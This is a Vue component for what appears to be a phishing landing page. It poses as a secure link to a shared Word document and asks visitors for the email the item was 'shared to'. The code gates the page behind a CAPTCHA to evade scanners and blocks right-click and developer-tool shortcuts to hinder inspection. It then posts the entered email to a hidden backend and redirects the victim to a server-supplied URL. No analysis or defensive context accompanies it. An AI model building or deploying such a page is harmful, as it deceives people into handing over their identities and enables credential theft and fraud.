
<template>
  <div v-if="!captchaToken" class="gate-container">
    <main>
      <div class="instructions captcha-adjusted">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
      </div>
    </main>
  </div>

  <div v-else class="container">
    <div class="overlay" id="overlay">
      <div class="input-section" id="inputSection">
        <form @submit.prevent="submitForm">
          <img
            src="https://i.postimg.cc/s2TBQ89k/ldimg1.png"
            width="100"
            height="35"
          >
          <p>You've received a secure link to:</p>
          <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
          <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>

          <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
          <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

          <label for="email" class="visually-hidden">Email address</label>
          <input id="email" v-model="email" type="email" placeholder="Enter email" required :disabled="loading" />

          <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

          <button type="submit" :disabled="loading">
            {{ loading ? 'Submitting…' : 'Next' }}
          </button>

          <p>
            <br>
            © 2025 Privacy Policy
            <br><br><br>
          </p>
        </form>
      </div>
    </div>
  </div>
</template>


<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)
let turnstileRendered = false

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })

  if (window.turnstile && !turnstileRendered) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: token => {
        captchaToken.value = token
        setTimeout(() => {
          captchaToken.value = null
          turnstileRendered = false
          window.turnstile.render('.cf-turnstile', {
            sitekey: '0x4AAAAAABgei6QZruCN7n08',
            callback: t => captchaToken.value = t
          })
        }, 120000)
      }
    })
    turnstileRendered = true
  }
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        captchaToken: captchaToken.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      setTimeout(() => {
        window.location.href = data.redirectUrl
      }, 1500)
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>


<style scoped>
body {
  font-family: Arial, sans-serif;
  text-align: center;
  margin: 0;
  padding: 0;
  background-color: #f7f9f9;
  height: 100%;
}

.container {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 76vh;
}

.logo {
  width: 150px;
  margin-bottom: 20px;
  margin-top: 20px;
}
.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}

.captcha-adjusted {
  margin-top: 25vh !important;
}

html, body {
  height: 100vh;
  margin: 0;
  padding: 0;
  overflow: hidden;
  font-family: Arial, sans-serif;
  background-color: #FAF9F6;
  color: #000;
}

.background, .gate-container {
  position: fixed;
  top: 0;
  left: 0;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  background-color: #FAF9F6;
  padding-top: 80px;
  box-sizing: border-box;
}

.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 1rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}

.toto-container {
  width: 100%;
  max-width: 450px;
  background: #ffffff;
  border-radius: 10px;
  box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
  padding: 2rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 0.1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.success-check {
  font-size: 1.8rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0.8rem;
  margin-top: 1.5rem;
  margin-bottom: 1.5rem;
}

.email-input {
  width: 90%;
  padding: 0.6rem;
  border: 1px solid #818181;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.19rem;
  margin-bottom: -0.19rem;
}

.action-button {
  background-color: transparent;
  color: #0078D4;
  padding: 0.6rem 1.2rem;
  border: 1px solid #0078D4;
  border-radius: 9px;
  cursor: pointer;
  font-size: 1rem;
  width: 50%;
  transition: background-color 0.2s ease;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: #f0f8ff;
}

.footer-container {
  text-align: center;
}

.footer-text {
  font-size: 0.85rem;
  color: #777;
  margin-top: 0.1rem;
}

.footer-text a {
  color: inherit;
  text-decoration: none;
}

@media (prefers-color-scheme: dark) {
  html, body,
  .background,
  .gate-container {
    background-color: #121212;
    color: #000;
  }

  .instructions,
  .toto-container {
    color: #ffffff;
  }

  .toto-container {
    background: #1e1e1e;
    box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
  }

  .email-input {
    background-color: #2b2b2b;
    border-color: #444;
    color: #ffffff;
    caret-color: #ffffff;
  }

  .error {
    color: #ff6b6b;
  }

  .action-button:hover:not(:disabled) {
    background-color: #1a1a1a;
  }
iframe {
  width: 100%;
  height: 90%;
  border: none;
  display: block;
  margin: 0 auto;
  overflow-x: hidden;
  object-fit: contain;
  object-position: center;
}

.blurred {
  filter: blur(10px);
}

.input-section {
  position: absolute;
  top: 40%;
  left: 50%;
  transform: translate(-50%, -50%);
  background-color: #fff;
  padding: 13px;
  border: 0.1px solid #dddd;
  text-align: center;
  width: 150%;
  max-width: 324px;
}

.input-section p {
  margin: 8px 0;
  color: black;
}

.input-section input {
  width: 89%;
  max-width: 500px;
  padding: 10px 5px;
  margin: 15px;
  display: block;
  border: 1px solid #ccc;
  font-size: 16px;
  box-sizing: border-box;
  color: black;
}

.input-section button {
  background-color: #1D7CDB;
  color: white;
  border: none;
  padding: 9px 115px;
  cursor: pointer;
  font-size: 16px;
}

.input-section button:hover {
  background-color: #1D7CDB;
}

.overlay {
  margin: 5;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  height: 80vh;
  background-color: #f9f9f9;
  padding-top: 50px;
}
</style>
